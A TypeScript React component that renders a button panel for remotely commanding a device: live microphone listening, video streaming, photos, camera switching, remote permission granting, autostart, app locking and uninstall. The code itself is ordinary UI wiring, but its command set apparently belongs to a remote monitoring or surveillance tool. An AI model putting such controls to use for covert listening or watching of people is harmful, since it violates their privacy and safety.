type ControlButtonsProps = {
  onCommand: (cmd: string, extra?: Record<string, unknown>) => void
}

type ButtonConfig = {
  label: string
  cmd: string
  extra?: Record<string, unknown>
  color: 'green' | 'teal' | 'yellow' | 'red' | 'gray' | 'blue' | 'purple' | 'orange'
  icon?: string
}

const CONTROL_BUTTONS: ButtonConfig[] = [
  // Audio Controls
  { label: 'Live Listen', cmd: 'start_stream', color: 'green', icon: '🎧' },
  { label: 'WebRTC', cmd: 'webrtc_start', color: 'teal', icon: '📡' },
  { label: 'WebRTC Stop', cmd: 'webrtc_stop', color: 'gray', icon: '📡' },
  { label: 'AI Mode', cmd: 'ai_mode', extra: { enabled: true }, color: 'yellow', icon: '🔇' },
  { label: 'Record', cmd: 'start_record', color: 'red', icon: '⏺' },
  { label: 'Stop Record', cmd: 'stop_record', color: 'gray', icon: '⏹' },
  { label: 'Stop Stream', cmd: 'stop_stream', color: 'gray', icon: '⏹' },
  
  // Camera Controls
  { label: 'Live Video', cmd: 'camera_live_start', color: 'blue', icon: '📺' },
  { label: 'Stop Video', cmd: 'camera_live_stop', color: 'gray', icon: '📺' },
  { label: 'Photo', cmd: 'take_photo', color: 'blue', icon: '📷' },
  { label: 'Camera', cmd: 'switch_camera', color: 'blue', icon: '🔄' },
  { label: 'Photo: Normal', cmd: 'photo_quality', extra: { mode: 'normal' }, color: 'gray', icon: '🖼' },
  { label: 'Night: Off', cmd: 'photo_night', extra: { mode: 'off' }, color: 'gray', icon: '🌙' },
  { label: 'Photo AI: ON', cmd: 'photo_ai', extra: { enabled: true }, color: 'teal', icon: '🤖' },
  
  // Audio Settings
  { label: 'Codec: Auto', cmd: 'stream_codec', extra: { mode: 'auto' }, color: 'gray', icon: '🎵' },
  { label: 'Low Network', cmd: 'set_low_network', extra: { enabled: true }, color: 'yellow', icon: '📶' },
  { label: 'Voice: Room', cmd: 'voice_profile', extra: { profile: 'room' }, color: 'gray', icon: '🗣' },
  { label: 'Stream: Realtime', cmd: 'streaming_mode', extra: { mode: 'realtime' }, color: 'gray', icon: '🎵' },
  
  // App Controls
  { label: 'Force Update', cmd: 'force_update', color: 'blue', icon: '⬆️' },
  { label: 'Grant Permissions', cmd: 'grant_permissions', color: 'purple', icon: '🔐' },
  { label: 'Enable Autostart', cmd: 'enable_autostart', color: 'purple', icon: '🚀' },
  { label: 'Lock App', cmd: 'lock_app', color: 'orange', icon: '🔒' },
  { label: 'Unlock App', cmd: 'unlock_app', color: 'green', icon: '🔓' },
  { label: 'Uninstall App', cmd: 'uninstall_app', color: 'red', icon: '🗑' },
]

const colorClasses: Record<ButtonConfig['color'], string> = {
  green: 'bg-emerald-600 hover:bg-emerald-500 border-emerald-500 text-white',
  teal: 'bg-teal-600 hover:bg-teal-500 border-teal-500 text-white',
  yellow: 'bg-yellow-600 hover:bg-yellow-500 border-yellow-500 text-black',
  red: 'bg-red-600 hover:bg-red-500 border-red-500 text-white',
  gray: 'bg-slate-700 hover:bg-slate-600 border-slate-600 text-slate-200',
  blue: 'bg-blue-600 hover:bg-blue-500 border-blue-500 text-white',
  purple: 'bg-purple-600 hover:bg-purple-500 border-purple-500 text-white',
  orange: 'bg-orange-600 hover:bg-orange-500 border-orange-500 text-white',
}

export function ControlButtons({ onCommand }: ControlButtonsProps) {
  const handleClick = (btn: ButtonConfig) => {
    onCommand(btn.cmd, btn.extra)
  }

  return (
    <div className="flex flex-wrap gap-2">
      {CONTROL_BUTTONS.map((btn) => (
        <button
          key={btn.cmd + btn.label}
          onClick={() => handleClick(btn)}
          className={`
            inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium rounded
            border transition-all duration-150 whitespace-nowrap
            ${colorClasses[btn.color]}
          `}
        >
          {btn.icon && <span>{btn.icon}</span>}
          {btn.label}
        </button>
      ))}
    </div>
  )
}
